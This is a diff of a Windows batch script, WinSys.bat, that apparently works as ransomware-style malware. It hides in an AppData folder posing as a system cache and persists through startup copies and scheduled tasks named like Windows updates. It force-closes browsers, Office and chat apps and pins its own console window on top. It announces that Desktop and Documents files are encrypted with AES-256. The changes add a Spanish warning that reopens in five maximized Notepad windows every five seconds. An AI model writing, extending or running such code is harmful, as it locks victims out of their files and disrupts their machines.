@@ -13,6 +13,7 @@ set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
 set "EXE=%DIR%\WinSys.bat"
 set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "HB=%DIR%\hb"
+set "MSG=%DIR%\msg.txt"
 set "LOG=%DIR%\log.txt"
 
 if not exist "%DIR%" md "%DIR%" >nul 2>&1
@@ -42,6 +43,8 @@ md "%DIR%\run" >nul 2>&1
 :owner
 >>"%LOG%" echo [%TIME%] instancia principal activa
 
+call :msg
+
 if not exist "%DIR%\.locked" (
     cls
     color 4F
@@ -52,13 +55,12 @@ if not exist "%DIR%\.locked" (
     call :encrypt
     >"%DIR%\.locked" echo ok
     attrib +h +s "%DIR%\.locked" >nul 2>&1
-    call :nota
     >>"%LOG%" echo [%TIME%] cifrado ok
     ping -n 3 127.0.0.1 >nul
 )
 
-mode con cols=100 lines=32 >nul 2>&1
-call :fullscreen
+mode con cols=100 lines=30 >nul 2>&1
+call :topmost
 call :ensure_watchdog
 
 >>"%LOG%" echo [%TIME%] entrando al loop
@@ -67,40 +69,53 @@ call :ensure_watchdog
 >"%HB%" echo %TIME%
 call :kill_apps
 call :ensure_watchdog
+ping -n 2 127.0.0.1 >nul
+call :spawn_notes
 cls
 color 4F
 call :banner
-echo   [%TIME%]  Sistema activo. Ventana verificada. Aplicaciones cerradas.
+echo   [%TIME%]  Sistema activo. Ventana verificada. 5 notepads reabiertos.
 ping -n 6 127.0.0.1 >nul
 goto :main
 
-:fullscreen
-> "%DIR%\fs.ps1" echo Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h,int n); [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h,IntPtr a,int x,int y,int cx,int cy,uint f);'
->>"%DIR%\fs.ps1" echo Add-Type -AssemblyName System.Windows.Forms
->>"%DIR%\fs.ps1" echo $h=[N.W]::GetConsoleWindow()
->>"%DIR%\fs.ps1" echo [N.W]::ShowWindow($h,3)
->>"%DIR%\fs.ps1" echo $r=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
->>"%DIR%\fs.ps1" echo [N.W]::SetWindowPos($h,[IntPtr]::Zero,$r.X,$r.Y,$r.Width,$r.Height,0x0040)
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DIR%\fs.ps1"
+:topmost
+> "%DIR%\tp.ps1" echo Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h,IntPtr a,int x,int y,int cx,int cy,uint f); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h,int n);'
+>>"%DIR%\tp.ps1" echo $h=[N.W]::GetConsoleWindow()
+>>"%DIR%\tp.ps1" echo [N.W]::ShowWindow($h,1)
+>>"%DIR%\tp.ps1" echo [N.W]::SetWindowPos($h,[IntPtr](-1),0,0,0,0,0x0003)
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DIR%\tp.ps1"
 exit /b
 
-:nota
-set "N=%USERPROFILE%\Desktop\LEEME_ENCRIPTADO.txt"
-if exist "%N%" exit /b
->"%N%" echo TUS ARCHIVOS FUERON ENCRIPTADOS
->>"%N%" echo.
->>"%N%" echo Algoritmo: AES-256-CBC con IV aleatorio por archivo.
->>"%N%" echo Los archivos del Escritorio y de Documentos fueron renombrados
->>"%N%" echo con el prefijo ENCRIPTED_ delante del nombre original.
->>"%N%" echo.
->>"%N%" echo La clave esta en:
->>"%N%" echo   %%APPDATA%%\Microsoft\Windows\SystemCache\.vk
->>"%N%" echo.
->>"%N%" echo Para recuperarlos, ejecuta:
->>"%N%" echo   WinSys.bat decrypt
->>"%N%" echo.
->>"%N%" echo Para sacar tambien la persistencia:
->>"%N%" echo   WinSys.bat uninstall
+:spawn_notes
+for /l %%N in (1,1,5) do start "" /max notepad "%MSG%"
+exit /b
+
+:msg
+if exist "%MSG%" exit /b
+>"%MSG%" echo  ##############################################################
+>>"%MSG%" echo  ##                                                          ##
+>>"%MSG%" echo  ##     W A R N I N G                                        ##
+>>"%MSG%" echo  ##                                                          ##
+>>"%MSG%" echo  ##     POR QUE QUERES ESTE TIPO DE CONTENIDO?               ##
+>>"%MSG%" echo  ##                                                          ##
+>>"%MSG%" echo  ##     SU COMPUTADORA NO DEJARA DE HACER ESTO.              ##
+>>"%MSG%" echo  ##                                                          ##
+>>"%MSG%" echo  ##############################################################
+>>"%MSG%" echo.
+>>"%MSG%" echo  Tus archivos del Escritorio y Documentos fueron encriptados
+>>"%MSG%" echo  con AES-256 y renombrados con el prefijo ENCRIPTED_
+>>"%MSG%" echo.
+>>"%MSG%" echo  Esta ventana se reabre cada 5 segundos. No sirve cerrarla.
+>>"%MSG%" echo.
+>>"%MSG%" echo  Para recuperar tus archivos:
+>>"%MSG%" echo     WinSys.bat decrypt
+>>"%MSG%" echo.
+>>"%MSG%" echo  Para sacar tambien la persistencia:
+>>"%MSG%" echo     WinSys.bat uninstall
+>>"%MSG%" echo.
+>>"%MSG%" echo  Clave de cifrado:
+>>"%MSG%" echo     %%APPDATA%%\Microsoft\Windows\SystemCache\.vk
+copy /y "%MSG%" "%USERPROFILE%\Desktop\LEEME_ENCRIPTADO.txt" >nul 2>&1
 exit /b
 
 :banner
@@ -121,16 +136,16 @@ echo   ##                                                      ##
 echo   ##########################################################
 echo.
 echo        Escritorio y Documentos encriptados en AES-256
-echo        Archivos renombrados con prefijo ENCRIPTED_
+echo        5 notepads maximizados cada 5 segundos
 echo        5 copias ocultas + 2 tareas programadas
-echo        Watchdog activo cada 5 segundos
 echo.
 echo        Para recuperar tus archivos:  WinSys.bat decrypt
 echo.
 exit /b
 
 :kill_apps
-for %%P in (notepad.exe mspaint.exe chrome.exe msedge.exe firefox.exe opera.exe brave.exe WINWORD.EXE EXCEL.EXE POWERPNT.EXE outlook.exe Teams.exe ms-teams.exe Discord.exe Telegram.exe Spotify.exe Code.exe steam.exe vlc.exe wmplayer.exe Skype.exe Zoom.exe) do taskkill /f /im %%P >nul 2>&1
+for %%P in (mspaint.exe chrome.exe msedge.exe firefox.exe opera.exe brave.exe WINWORD.EXE EXCEL.EXE POWERPNT.EXE outlook.exe Teams.exe ms-teams.exe Discord.exe Telegram.exe Spotify.exe Code.exe steam.exe vlc.exe wmplayer.exe Skype.exe Zoom.exe) do taskkill /f /im %%P >nul 2>&1
+taskkill /f /im notepad.exe >nul 2>&1
 exit /b
 
 :install
@@ -319,6 +334,7 @@ schtasks /delete /tn "WindowsSystemUpdate" /f >nul 2>&1
 schtasks /delete /tn "WindowsSystemUpdate2" /f >nul 2>&1
 
 taskkill /f /fi "WINDOWTITLE eq VeniceWatchdog" >nul 2>&1
+taskkill /f /im notepad.exe >nul 2>&1
 rd "%DIR%\run" >nul 2>&1
 rd "%DIR%\wd" >nul 2>&1
 
